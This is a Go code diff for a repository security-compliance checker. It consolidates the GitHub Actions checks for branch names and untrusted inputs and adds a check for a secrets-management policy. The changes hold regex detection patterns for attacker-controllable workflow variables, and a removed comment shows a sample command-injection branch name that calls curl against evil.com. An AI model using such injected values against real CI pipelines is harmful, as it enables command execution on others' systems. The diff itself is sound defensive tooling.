@@ -34,20 +34,10 @@ var (
 		`github\.event\.pull_request\.head\.repo\.default_branch|` +
 		`github\.head_ref).*`)
 
-	// Branch name variables that could be used unsafely in workflow run steps.
-	// These are attacker-controllable when a PR is opened from a fork.
-	// When used directly in a run: step, GitHub textually injects the branch name
-	// into the shell script before execution, allowing command injection via
-	// a malicious branch name (e.g. a branch named: feature"; curl evil.com; echo ").
-	alwaysUnsafeBranchVars = regexp.MustCompile(`.*(github\.head_ref|` +
-		`github\.base_ref|` +
-		`github\.event\.pull_request\.head\.ref|` +
-		`github\.event\.pull_request\.base\.ref).*`)
-
-	// Branch ref variables that are only attacker-controllable in
-	// pull_request-triggered workflows. Checked separately so we can
-	// skip them for push-triggered workflows and avoid false positives.
-	pullRequestOnlyUnsafeBranchVars = regexp.MustCompile(`.*(github\.ref\b|` +
+	// Refs that are only attacker-controllable in pull_request /
+	// pull_request_target workflows. On push they are trusted, so they are
+	// checked separately and flagged only for PR-triggered workflows.
+	pullRequestOnlyUntrustedVars = regexp.MustCompile(`.*(github\.ref\b|` +
 		`github\.ref_name).*`)
 
 	// Refs that point at an untrusted code snapshot (a fork's PR head). Checking
@@ -145,11 +135,6 @@ func evaluateWorkflows(workflows []data.WorkflowFile, checkWorkflow func(*action
 func CicdSanitizedInputParameters(payload data.Payload) (gemara.Result, string, gemara.ConfidenceLevel) {
 	return checkAllWorkflows(payload, checkWorkflowFileForUntrustedInputs,
 		"GitHub Workflows variables do not contain untrusted inputs")
-}
-
-func CicdBranchNameSanitized(payload data.Payload) (gemara.Result, string, gemara.ConfidenceLevel) {
-	return checkAllWorkflows(payload, checkWorkflowFileForBranchNameUsage,
-		"GitHub Workflows do not use unsanitized branch names in run steps")
 }
 
 // CicdUntrustedCodeIsolation checks OSPS-BR-01.03: CI/CD pipelines that operate
@@ -393,16 +378,16 @@ func stripShellComment(command string) string {
 	return command
 }
 
-// checkWorkflowFileForBranchNameUsage checks a workflow for unsanitized branch name
-// variables used directly in run: steps, which can lead to command injection.
-// It applies two levels of checking:
-//   - alwaysUnsafeBranchVars: flagged regardless of trigger type (e.g. github.head_ref)
-//   - pullRequestOnlyUnsafeBranchVars: only flagged when the workflow has a
-//     pull_request or pull_request_target trigger (e.g. github.ref, github.ref_name)
-func checkWorkflowFileForBranchNameUsage(workflow *actionlint.Workflow) (bool, string) {
+// checkWorkflowFileForUntrustedInputs flags GitHub Actions context variables
+// used directly in run: steps that outside contributors can control (e.g. issue
+// titles, PR bodies, commit messages, branch refs). Interpolating them into a
+// shell script without sanitization can lead to command injection.
+//
+// github.ref and github.ref_name are only attacker-controllable in
+// pull_request / pull_request_target workflows, so they are flagged only there.
+func checkWorkflowFileForUntrustedInputs(workflow *actionlint.Workflow) (bool, string) {
 
-	// Determine if the workflow is triggered by pull request events,
-	// which makes github.ref and github.ref_name attacker-controllable.
+	// PR triggers make github.ref and github.ref_name attacker-controllable.
 	hasPullRequestTrigger := false
 	for _, event := range workflow.On {
 		if event.EventName() == "pull_request" || event.EventName() == "pull_request_target" {
@@ -410,49 +395,6 @@ func checkWorkflowFileForBranchNameUsage(workflow *actionlint.Workflow) (bool, s
 			break
 		}
 	}
-
-	var message strings.Builder
-
-	for _, job := range workflow.Jobs {
-		if job == nil {
-			continue
-		}
-
-		for _, step := range job.Steps {
-			if step == nil {
-				continue
-			}
-
-			run, ok := step.Exec.(*actionlint.ExecRun)
-			if !ok || run.Run == nil {
-				continue
-			}
-
-			varList := pullVariablesFromScript(run.Run.Value)
-
-			for _, name := range varList {
-				nameBytes := []byte(name)
-				if alwaysUnsafeBranchVars.Match(nameBytes) {
-					fmt.Fprintf(&message, "Unsanitized branch name variable found: %v\n", name)
-				} else if hasPullRequestTrigger && pullRequestOnlyUnsafeBranchVars.Match(nameBytes) {
-					fmt.Fprintf(&message, "Attacker-controllable ref variable in pull_request workflow: %v\n", name)
-				}
-			}
-		}
-	}
-
-	if message.Len() > 0 {
-		return false, message.String()
-	}
-	return true, ""
-}
-
-// checkWorkflowFileForUntrustedInputs checks a workflow for known untrusted
-// GitHub Actions context variables used directly in run: steps.
-// These variables (e.g. issue titles, PR bodies, commit messages) are
-// user-controllable and can lead to command injection when interpolated
-// into shell scripts without sanitization.
-func checkWorkflowFileForUntrustedInputs(workflow *actionlint.Workflow) (bool, string) {
 
 	var message strings.Builder
 
@@ -476,7 +418,9 @@ func checkWorkflowFileForUntrustedInputs(workflow *actionlint.Workflow) (bool, s
 			varList := pullVariablesFromScript(run.Run.Value)
 
 			for _, name := range varList {
-				if untrustedVars.Match([]byte(name)) {
+				nameBytes := []byte(name)
+				if untrustedVars.Match(nameBytes) ||
+					(hasPullRequestTrigger && pullRequestOnlyUntrustedVars.Match(nameBytes)) {
 					fmt.Fprintf(&message, "Untrusted input found: %v\n", name)
 				}
 			}
@@ -926,6 +870,18 @@ func SecretScanningInUse(payload data.Payload) (result gemara.Result, message st
 		return gemara.NeedsReview, "Secret scanning status is not observable with the current token; reading it requires repository admin access, and no Security Insights declaration was found", gemara.Low
 	}
 	return gemara.Failed, "GitHub reports secret scanning and push protection are both disabled", gemara.Medium
+}
+
+func SecretsManagementPolicy(payload data.Payload) (result gemara.Result, message string, confidence gemara.ConfidenceLevel) {
+	// A documented secrets-management policy is observable only when the project
+	// publishes it somewhere we can read — today that is the SECURITY.md file.
+	if payload.SecurityPosture.DefinesPolicyForHandlingSecrets() {
+		return gemara.Passed, "A documented policy for managing secrets and credentials was found in the repository's security policy", gemara.Medium
+	}
+
+	// The policy may still live in documentation we cannot observe (an external
+	// wiki, handbook, etc.), so this is unconfirmed rather than a violation.
+	return gemara.NeedsReview, "No documented policy for managing secrets and credentials was found in the repository's security policy; manual review is required to confirm one exists elsewhere", gemara.Low
 }
 
 // DependenciesUseStandardizedTooling implements OSPS-BR-05.01: when a build and
